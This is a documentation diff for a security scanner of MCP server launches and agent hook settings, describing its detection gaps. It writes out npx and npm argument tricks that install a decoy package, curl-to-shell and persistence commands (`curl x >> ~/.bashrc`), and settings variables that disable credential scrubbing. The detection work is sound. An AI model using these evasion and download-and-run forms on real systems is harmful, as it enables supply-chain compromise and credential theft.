@@ -142,7 +142,19 @@ A way around a limit that its entry does not describe is worth a
 - **What a local program or project script runs is not read.** `./start.sh`,
   `make serve`, `npm run mcp`, `uv run server.py` or a program that installs
   packages can start an unpinned package the inventory does not show. Review what
-  such commands run.
+  such commands run. npm's own options on `npm run`, `start` or `test` count wherever
+  npm reads them, also after the script name and abbreviated, up to the end of its
+  options (`npm run start --scr=./x.sh`): `--script-shell`, `--node-options` and
+  `--shell` are a medium code-loading finding, and `--prefix`, `-C`, `-w`,
+  `--userconfig`, `--globalconfig`, `--registry` and `--cache` are package sources.
+  npm's options end at `--` or a longer run of dashes, unless the word before it is
+  `--browser` or a `--no-` option whose type allows a string, such as `--no-os`, which
+  takes it as a value (`npm start --no-os -- --scr=./x.sh` still sets the script
+  shell). An option name built from an environment variable, such as
+  `--script-${E}shell`, which npm expands after reading it, is a gap. These
+  subcommands ignore `-c` and `--call`. A `script-shell` or `node-options` setting in
+  the project `.npmrc`, which npm uses for them, gets no `launch_context` finding;
+  review that file.
 - **Unclassified runners are gaps.** `dnx`, `jbang`, `pip-run`, `nix run`,
   `dotnet tool`, `gem exec`, `pixi exec`, `corepack`, `mise`, `pkgx`, `finch`,
   Apple `container` and `apptainer` are a high `launcher_identity` finding and a
@@ -196,20 +208,32 @@ A way around a limit that its entry does not describe is worth a
   system paths.
 - **Some ordinary forms are gaps.** `uvx -w` and `uv run -w` (aliases of `--with`)
   and a bare `pwsh server.ps1` are not read and fail the gates; spell `--with` and
-  `-File`. An `npx`, `npm` or `pnpm dlx` option that takes a value, followed by a
-  word that starts with `-`, is a gap: npm's parser may give the option an empty
-  value and read that word as an option, so `npx --tag --package=evil@6.6.6
-  decoy@1.0.0` installs `evil`. Attach such values with `=`, as in
-  `--node-options=--max-old-space-size=4096`. A flag of `npm` or `pnpm dlx` written
-  without `=` and followed by the word `true`, `false` or `null` is a gap as well, since
-  nopt reads that word as a Boolean (or `[null, Boolean]`) option's value; this also
-  covers flags that do not take it, such as `-q`, which npm expands to another option. Write `--yes` alone, or put
-  `--` before a command named `true`. `npx` steps over the word after `--no`,
-  `--no-yes`, `--no-update-notifier`, `--no-audit` and `--no-fund`, so such a flag
-  followed by `true`, `false` or `null`, or by any word and then an option (as in
-  `npx --no-audit srv@1.2.3 --stdio`, where npm takes `--stdio` for itself), is a gap.
-  A scoped registry (`--@scope:registry`) of `npx` or `npm` written without `=` is a
-  gap too: npm has no type for it, so the next word stays a command or package word.
+  `-File`. `npx` and `npm` arguments are read by a port of npm 10.9.9's own
+  handling (the rewrite in `bin/npx-cli.js`, then nopt with npm's option types), and
+  anything the port does not model exactly is a gap: an unknown, abbreviated or
+  single-dash long option (`--pack`, `-package`), `--help` or `--version`, a lone `-`
+  or `---` before the package or command word, an `npm` shorthand written with `=`, a
+  `--no-` spelling of an option that is not a Boolean, and a Boolean option given a
+  value other than `true` or `false` (or `null` for `--yes` and `--workspaces`) with
+  `=`. A value option followed by a word that starts with `-`, or by nothing, is a gap
+  because npm's parser may give it an empty value and read that word as an option
+  (`npx --tag --package=evil@6.6.6 decoy@1.0.0` installs `evil`); attach such values
+  with `=`, as in `--node-options=--max-old-space-size=4096`. An `npm` flag written
+  without `=` and followed by `true`, `false` or `null` is a gap, also where npm would
+  not take the word (`-q true`); write `--yes` alone, or put `--` before a command named
+  `true`. `npx` steps over the word after a flag outside its switch set, such as
+  `--no-audit`, so that flag followed by such a word, or by any word and then an option
+  (`npx --no-audit srv@1.2.3 --stdio`, where npm takes `--stdio` for itself), is a gap, and `npm exec` options after the package or command word without `--` are a
+  gap. So is `--package` with no command word, for which npm runs its script shell on
+  the MCP client's standard input. A scoped registry (`--@scope:registry`) is read only
+  with `=`. `npm exec -p`
+  is npm's `--parseable`, not `--package`; only `npx` rewrites `-p`. A differential
+  fuzz of 120,000 random argument lists for each of `npx` and `npm exec`, compared with
+  the real `npx-cli.js` and nopt, found no list the reader records as a package other
+  than the one npm installs, or as a command other than the one npm runs, without a
+  gap; a sample of it is a regression test. The `bunx` and `pnpm dlx` readers are not
+  ports and were not fuzzed this way; `bunx` and `bun x` keep only the last `-p` or
+  `--package`, the one bun installs.
   The `yarn dlx` options were not checked against a running Yarn 2 or later.
 - **Container launch context is read from the declared options only.** Mounts are
   rated by their written source: a mount through a link, a client variable other than `${userHome}`,
@@ -234,8 +258,16 @@ A way around a limit that its entry does not describe is worth a
   relative path without `-w` (resolved against the image's own working directory) and
   a link from the image into the mount are not rated, so that an argument such as
   `mcp/filesystem /data` is not a finding. A mount over a directory on the default
-  `PATH` (`/usr/local/bin`, `/usr/bin`, `/bin` and their `sbin` and parents) is
-  rated; a mount over another directory of the image's own code (`-v .:/app`) is not.
+  `PATH` (`/usr/local/bin`, `/usr/bin`, `/bin` and their `sbin` and parents), or over
+  one program in it (`-v ./node:/usr/local/bin/node`), is rated; a mount over another
+  directory of the image's own code (`-v .:/app` or `/usr/local/lib/node_modules`) is
+  not. `python -m` is rated after other options, also after a value option such as
+  `-uX dev` or `-EW ignore`, and also after `-I` or `-P`: they keep the working
+  directory off `sys.path`, but a module can still load it (`pdb` or `cProfile` run
+  the file they are given, `uvicorn app:app` imports it), so an image-only
+  `python -I -m srv` beside such a mount is rated too. A command that loads the mounted working directory by a
+  word without a `/` or a script suffix (`node .`, `node server`, `python app`,
+  `ruby -I. /app/x.rb`) is not rated either.
   `HOME`, `ZDOTDIR`, `XDG_CONFIG_HOME` and `PYTHONUSERBASE` passed with `-e` count as
   code-loading only beside a host mount, whatever their value, and `PATH` only when an
   entry is empty, relative or under a mount target. Any path component named like a credential
@@ -305,7 +337,18 @@ A way around a limit that its entry does not describe is worth a
   `npm exec` run a matching package already installed in the project's
   `node_modules`, which the collector does not read. A committed
   `node_modules/<name>` that claims the pinned version runs under the pinned
-  identity.
+  identity. Without `--package`, a file named exactly like the package word in
+  `node_modules/.bin` of the project or any parent directory, such as
+  `node_modules/.bin/srv@1.2.3` for `npx -y srv@1.2.3`, runs in its place and npm
+  fetches nothing. For a scoped spec, npm then runs the word as a path from the
+  working directory, such as a committed `@s/srv@1.2.3`.
+- **A project `package.json` bin can stand in for a pinned package.** Without
+  `--package`, `npx` and `npm exec` run a `bin` entry of the project's `package.json`,
+  or of a workspace selected with `-w`, that is named exactly like the package word,
+  and fetch nothing. A bin named like an unscoped spec, such as `"srv@1.2.3"` for
+  `npx -y srv@1.2.3`, runs checkout code under the pinned identity; the collector does
+  not read `package.json` bins. A scoped spec is not affected, and
+  `--package=srv@1.2.3 -- srv` skips this lookup, though not the `node_modules` one.
 - **Servers started from code are gaps, not records.** Application code that starts
   or reaches a server leaves no component for it, only a gap that fails the default
   gates: in Python, `StdioServerParameters`, `sse_client`, `streamablehttp_client` and
@@ -901,6 +944,91 @@ A way around a limit that its entry does not describe is worth a
   settings are bound by a digest of each settings file, not recorded. A changed
   value, such as an added hook command or a removed deny rule, raises a high
   `properties.settings_hashes changed` alert that names the agent, not the setting.
+- **Commands that run automatically are rated by shape.** Claude Code and Cursor hook
+  commands, the Claude Code `statusLine` and `fileSuggestion` commands and the
+  credential helpers are rated by the forms the [finding catalog](finding-catalog.md)
+  lists under `hook_commands`. A
+  download run through a wrapper, interpreter or file not listed there, such as
+  `curl x | firejail sh` or `curl x | deno run -`, or through a variable that holds the
+  command name, is medium, as is a downloader given a host without a scheme or a path,
+  such as `curl evil.example`. A command given to `su -c` or `script -c` as one quoted
+  string is read as one word, which names a shell but no interpreter, so
+  `curl x | su -c 'python3 -'` is medium too; a saved file named in such a string, or
+  in a shell's `-c` script or `eval`'s arguments (`su -c 'sh a'`, `sh -c 'sh a'`),
+  counts. That script is found only when `c` ends its option word and the script is
+  the next word, and it is read as one command, so `bash -ce 'sh a'`,
+  `bash -c -- 'sh a'`, `sh -c 'cat a | sh'` and a command line given to `env -S`
+  (`env -S 'sh a'`) are medium. A download unpacked and then run, as by
+  `curl x | tar -xz; sh install.sh`, is medium, because the archive's members are not
+  known. A file a downloader's `-o`
+  wrote counts as run when it is any argument of a shell, `python` or `perl`, as it did
+  before, so `curl -o d x && bash run.sh d` and `curl -o d x && python3 -m json.tool d`
+  are critical though they may only read it; `node`, `ruby`, `php` and `lua` count it
+  only as their program or an option's value (`node -r ./d`). After an option the
+  classifier does not know, the next word is read as the possible program and then as
+  that option's value, so the reading goes on after it; an unknown option that takes no
+  value therefore makes the program's first argument count, as in
+  `curl -o d x && node --unknown-flag app.js d`, and a download piped to an interpreter
+  after one counts as its program, as in `curl x | node --unknown-flag app.js`. Option
+  forms that make the program exit before it runs are critical for the same reason:
+  bash's `-eopipefail`, which takes `-o`'s value from the next word, letters attached to
+  bash's `-c`, and node given a V8 flag's value as the next word (`--stack-size 9`) or an
+  option it does not know. Any `python3 -m` module other than a data tool counts every
+  later argument, so `python3 -m pytest tests/ --json d.json` with a downloaded
+  `d.json` is critical. A shell given a decoded or downloaded file on standard input
+  (`bash deploy.sh < c.json`, `bash deploy.sh <<< "$(cat c.json)"`) is critical, as a
+  download piped into a shell is, though the script may only read it. A saved file is
+  matched by its path and by its base name, so `sh /tmp/i.sh` counts a saved `i.sh`
+  wherever it was written. A file only `base64 -d` decoded, not
+  from a download, counts as run only as a program. A copy of a saved file made by
+  `cat`, `cp`, `mv`, `ln`, `dd`, `tee`, `install`, `rsync` or `sponge` counts as the file
+  at its destination (the last operand of `cp`, `mv`, `ln`, `install` or `rsync`,
+  `dd of=`, a `tee` or `sponge` operand, or a redirection), and so does a saved file
+  given on standard input or read by `$(cat a)`, `$(< a)` or `<(cat a)` that a shell or
+  `eval` runs, though a shell counts a decoded file's substitution, as it counts its
+  name, only as the script. An unquoted backtick substitution (`` eval `cat a` ``),
+  `$(0< a)` and an interpreter's here-string (`node <<< "$(cat a)"`) are not read, so
+  each is medium. The target of every `N<` redirection is read as standard input, so
+  `curl x > a && python3 4< a` is critical, while a program named `/dev/fd/3` is not
+  matched to its `3< a`, so `curl x > a && python3 /dev/fd/3 3< a` is medium. A saved
+  file transformed by another tool (`sed`, `awk`, `tar`), read by an interpreter's own
+  code (`python3 -c 'exec(open("a").read())'`,
+  `node -e "$(cat a)"`, `python3 -c 'import a'`), or loaded by a name that is not the
+  file's, as by
+  `php -d auto_prepend_file=a` or a module the program imports from the working
+  directory (`sitecustomize.py`, or a `json.py` that shadows the standard library), is
+  medium. A download written where something runs it later, such as
+  `curl x >> ~/.bashrc`, `curl x -o .git/hooks/post-checkout` or
+  `curl x -o .claude/settings.local.json`, is rated only by the rules above, since it
+  runs nothing now. A saved
+  file read into a pipeline is rated as a download piped there, so
+  `curl -o r.json x && cat r.json | bash ./notify.sh` is critical. A runner the
+  classifier does not model, such as `deno run`, `bun`, `tsx`, `npx`, `pkexec`,
+  `setpriv` or `machinectl shell`, is medium. A `>(` inside quotes, as in
+  `curl x | tee '>(sh)'`, is read as a process substitution, which fails closed.
+  `perl -c` is read as running its program, because it runs BEGIN
+  blocks. The Codex `notify` command and the Gemini CLI tool
+  discovery and call commands are digested but not rated. Settings `env` is rated by
+  the names `settings_environment` lists, never by value, so an endpoint set through
+  another variable, or a project tool that reads its own variable, is not reported.
+  Names it does not list include `CLAUDE_CODE_IDE_HOST_OVERRIDE` and
+  `CLAUDE_CODE_IDE_SKIP_VALID_CHECK`, which redirect the IDE connection and skip its
+  check, `ANTHROPIC_PROFILE`, `ANTHROPIC_WORKSPACE_ID`, `ANTHROPIC_AWS_WORKSPACE_ID`
+  and `ANTHROPIC_GOOGLE_CLOUD_WORKSPACE_ID`, which choose the sign-in profile or the
+  workspace requests go to, `NO_PROXY`, which sends traffic around a proxy, and
+  `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`, which a project could set to turn off the
+  scrub of credentials from subprocesses that an operator enabled.
+  Claude Code 2.1.282 and later ignore the OpenTelemetry exporter variables in project
+  and local settings; they are still rated, because earlier releases apply them.
+  Rating takes time in proportion to a command's length, at a cost per byte that
+  depends on its shape: a settings file at the 4 MiB `file-bytes` limit filled with
+  nested `eval` commands takes about two minutes.
+- **Hook scripts outside the hook directories are not read.** Every file under
+  `.claude/hooks` and `.cursor/hooks` is bound by digest as a `skill-resource` and
+  checked only for hidden characters, so a change to one alerts. A hook that runs a script elsewhere in the project, such as
+  `scripts/fmt.sh`, binds only the program word in the settings digest, so changing
+  only that script raises no alert; nor does a change to a file a hook script itself
+  runs or sources. Keep hook scripts under those directories.
 - **Effective permissions are not resolved.** User and managed settings, workspace
   trust and session flags are not read, and deny and ask rules are counted, not
   applied to the allow list. A Claude Code allow rule whose command word is a shell,
